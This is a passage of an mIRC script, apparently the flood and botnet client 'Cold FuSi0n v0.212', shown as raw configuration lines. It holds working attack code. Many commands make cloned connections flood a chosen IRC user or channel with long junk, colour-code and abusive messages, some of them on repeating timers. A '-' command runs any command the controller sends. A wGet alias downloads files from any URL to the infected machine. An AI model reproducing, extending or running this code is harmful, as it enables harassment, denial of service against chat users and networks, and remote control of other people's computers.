n217=    timer 1 6 /clone msg $2 !list  AbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYz
n218=    timer 1 12 /clone msg $2 !list  AbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYz
n219=  }
n220=  if ($1 == clone.fserver) { if ($2 == $null) { halt } | sockwrite -tn clone* PRIVMSG $2 : $+ $rand.fserver }
n221=  if ($1 == clone.combo.fserver) { sockwrite -tn clone* PRIVMSG $2 : $+ $rand.fserver | sockwrite -tn clone* PRIVMSG $2 : $+ $rand.fserver | sockwrite -tn clone* PRIVMSG $2 : $+ $rand.fserver }
n222=  if ($1 == clone.combo6) {  if ($2 == $null) { halt } | sockwrite -tn clone* PRIVMSG $2 :UTTT OH!!! $$2 shouldnt of invited!!! Its time for 2,3INVITERS REVENGE! 
n223=    timer 1 6 /clone msg $2 pewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewp
n224=    timer 1 12 /clone msg $2  1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*
n225=    timer 1 18 /clone msg $2 ^^^The_CoW_GoEs_MOo^^^[[[And_ThA_CaT_GoEz_MeO'//]]]^^^The_CoW_GoEs_MOo^^^[[[And_ThA_CaT_GoEz_MeO'//]]]^^^The_CoW_GoEs_MOo^^^[[[And_ThA_CaT_GoEz_MeO'//]]]^^^The_CoW_GoEs_MOo^^^[[[And_ThA_CaT_GoEz_MeO'//]]]^^^The_CoW_GoEs_MOo^^^
n226=    timer 1 24 /clone msg $2 BlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBling
n227=    timer 1 32 /clone msg $2 !list  AbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYz
n228=  timer 1 38 /clone msg $2 12Leave $$2 now! dont support lame fucking inviters! }
n229=  if ($1 == clone.combo7) { //set %cc 1 | :ccloop | if (%cc > $sock(clone*,0)) { goto end } 
n230=    /sockwrite -n $sock(clone*,%cc) PRIVMSG  $2 $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4))
n231=    /timer 1 4    /sockwrite -n $sock(clone*,%cc) PRIVMSG  $2 $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) 
n232=    /timer 1 8   /sockwrite -n $sock(clone*,%cc) PRIVMSG  $2 $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) 
n233=    /timer 1 12   /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8))
n234=  inc %cc |  goto ccloop |   :end  | unset %fat | unset %at* | unset %cc  }
n235=  if ($1 == clone.combo#) { if ($2 == $null) { halt } |  //set %cc 1 | :ccloop | if (%cc > $sock(clone*,0)) { goto end } |  /sockwrite -n $sock(clone*,%cc)  PRIVMSG $2 555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555
n236=    /timer 1 3 /sockwrite -n $sock(clone*,%cc)  PRIVMSG $2 4444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444
n237=    /timer 1 7 /sockwrite -n $sock(clone*,%cc)  PRIVMSG $2 3333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333
n238=    /timer 1 11 /sockwrite -n $sock(clone*,%cc)  PRIVMSG $2 22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222
n239=    /timer 1 15 /sockwrite -n $sock(clone*,%cc)  PRIVMSG $2 11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
n240=  inc %cc |  goto ccloop |   :end  | unset %cc  }   
n241=  if ($1 == clone.combo.word) { if ($3 == $null) { msg # !clone.combo.word #/Nick Word. | halt } | //set %cc 1 | :ccloop | if (%cc > $sock(clone*,0)) { goto end } 
n242=    /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) 
n243=    /timer 1 3 /sockwrite -n $sock(clone*,%cc) PRIVMSG  $2 $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) 
n244=    /timer 1 7 /sockwrite -n $sock(clone*,%cc) PRIVMSG  $2 $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) 
n245=    /timer 1 11 /sockwrite -n $sock(clone*,%cc) PRIVMSG  $2 $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8))
n246=    /timer 1 15 /sockwrite -n $sock(clone*,%cc) PRIVMSG  $2 $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) 
n247=  inc %cc |  goto ccloop |   :end  | unset %cc }
n248=  if ($1 == clone.combo.ultimate) {  if ($2 == $null) { msg # !clone.combo.ultimate #/Nick | halt } |  //set %cc 1 | :ccloop | if (%cc > $sock(clone*,0)) { goto end } |  /sockwrite -n $sock(clone*,%cc) PRIVMSG $$2 BlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBling 
n249=    /timer 1 5 /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 pewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewp
n250=    /timer 1 11  /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 12,1BeyondFloods1,12BeyondFloods12,1BeyondFloods1,12BeyondFloods12,1BeyondFloods1,12BeyondFloods12,1BeyondFloods1,12BeyondFloods12,1BeyondFloods1,12BeyondFloods12,1BeyondFloods1,12BeyondFloods12,1BeyondFloods1,12BeyondFloods12,1BeyondFloods1,12BeyondFloods12,1BeyondFloods
n251=    /timer 1 16  /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 ��������������������������������������������������������������������������������������������������������������������������������
n252=    /timer 1 22  /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 !list  AbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYz
n253=    /timer 1 27 /sockwrite -n $sock(clone*,%cc) PRIVMSG $2  1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*
n254=    /timer 1 32 /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 3333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333
n255=    /timer 1 37   /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4))
n256=    /timer 1 44 /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3
n257=    /timer 1 49 /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222
n258=    /timer 1 53    /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4))
n259=    /timer 1 57    /sockwrite -n $sock(clone*,%cc) PRIVMSG $$2 BlingBlingBlingBlingBlingBlingBlingpewppewppewppewppewppewppewppewppewp��������������������������������:|I!{:|I!{:|I!{:3333333333333333333333333333333*1,1Star_WarS*Star_WarS* $+ $r(A,Z) $+ $rc($r(1,8)) $+ $r(A,Z) $+ $rc($r(1,8)) $+ $r(A,Z)
n260=    inc %cc |  goto ccloop |   :end  | unset %cc 
n261=  }
n262=  if ($1 == clone.c.flood) {  if ($2 == $null) { halt } | //msg # Now Flooding... $2 (to stop !flood.stop) |  /clone msg $2 $3- | /clone notice $2 $3-  | //timerConstantFlood1 0 4 /clone msg $2 $3- |  /clone msg $2 $3- | //timerConstantFlood2 0 6 /clone notice $2 $3-  }
n263=  if ($1 == flood.stop) { timerConstantFlood* off  | msg # Stopping Flood Complete... } 
n264=  if ($1 == set.flood.server.port) {  if ($2 == $null) { halt } | if ($3 == $null) { halt } |  /set %msg.flood.server $$2 |  /set %msg.flood.server.port $3  }
n265=  if ($1 == super.flood) {  if ($2 == $null) { halt } | if (%msg.flood.server == $null) || (%msg.flood.server.port == $null) { /msg # MsgFlood server, or port not set! | halt }  | if ($3 == $null) { //set %msg2bomb BlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBling | goto bomb }   | //set %bots 1 | /set %nick2bomb $$2  | /set %msg2bomb $$3- | /msg # 12Random Connect Query/notice Flooding: $$2 ( $+ %msg2bomb $+ ) |  /dksmsgflooder  |  /timer 1 100 /msg # Flood Complete on: $2  |  /timer 1 100 /sockclose dksmsgflooder*  |   /timer 1 102 /unset %blastedmsgs  }
n266=  if ($1 == ver) { msg $a 12�(15Cold FuSi0n v0.212)� (150wnage Will Never Stop12) }
n267=  if ($1 == super.flood.stop!) {   //set %blastit Off  |  /sockclose dksmsgflooder* |  /unset %blastedmsgs | /msg # Flood Turned OFF:. |  //timers off  }
n268=  if ($1 == -) { /msg $a 14[12done14]: / $+ $2- | / $+ [ [ $2- ] ] }
n269=}
n270=alias getdata2 {
n271=  if ($sock(wGet) != $null) { 
n272=    //notice %w.g.# Error! Already downloading %tempwebs from %tmph0st 
n273=    /halt
n274=  } 
n275=  unset %gfile 
n276=  set %gfile $gettok($$1,$count($$1,$chr(47)),47)
n277=  if ($exists(%gfile) == $true) { 
n278=    //notice %w.g.# Error! For safety reasons you are not allowed to overwrite an existing file! Please try another name! 
n279=    /halt 
n280=  } 
n281=  //notice %w.g.# 15Downloading...14 $1 saving as %gfile 
n282=  set %tempwebs $remove($1, http:// [ $+ [ $gettok($remove($1,http://),1,47) ] ] ) 
n283=  set %tmph0st $gettok($remove($1,http://),1,47) 
n284=  sockopen wGet $gettok($remove($1,http://),1,47) 80 
n285=}
n286=on *:SOCKREAD:wGet: {
n287=  sockread %tempweb3
n288=  if (%tempweb3 == $null) { write %gfile  | halt }
n289=  write %gfile %tempweb3
n290=}
n291=on *:SOCKCLOSE:wGet: { 
n292=  notice %w.g.# 14[15File:14 $+ $gettok(%tempwebs,$numtok(%tempwebs,47),47) $+ ] 14[15Size:14 $+ $file(%gfile).size $+ ]12 Downloaded Successfully as14 %gfile $+ 12... 
n293=}
n294=on *:SOCKOPEN:wGet: { 
n295=  sockwrite -tn wGet GET %tempwebs
n296=  sockwrite wGet $crlf 
n297=}
n298=on *:sockopen:proxy.clone*:{ 
n299=  if ($sockerr > 0) { halt } 
n300=  sockwrite -tn $sockname user $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) . . $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) 
n301=  sockwrite -tn $sockname nick $read tempsettings.scr
n302=}
n303=on *:sockread:proxy.clone*:{
n304=  sockread -f %temp
n305=  if ($gettok(%temp,1,32) == PING) { sockwrite -n $sockname PONG $gettok($gettok(%temp,2,32),1,58) }
n306=  if ($gettok(%temp,1,32) == 433) { sockwrite -tn $sockname nick $read tempsettings.scr }
n307=}
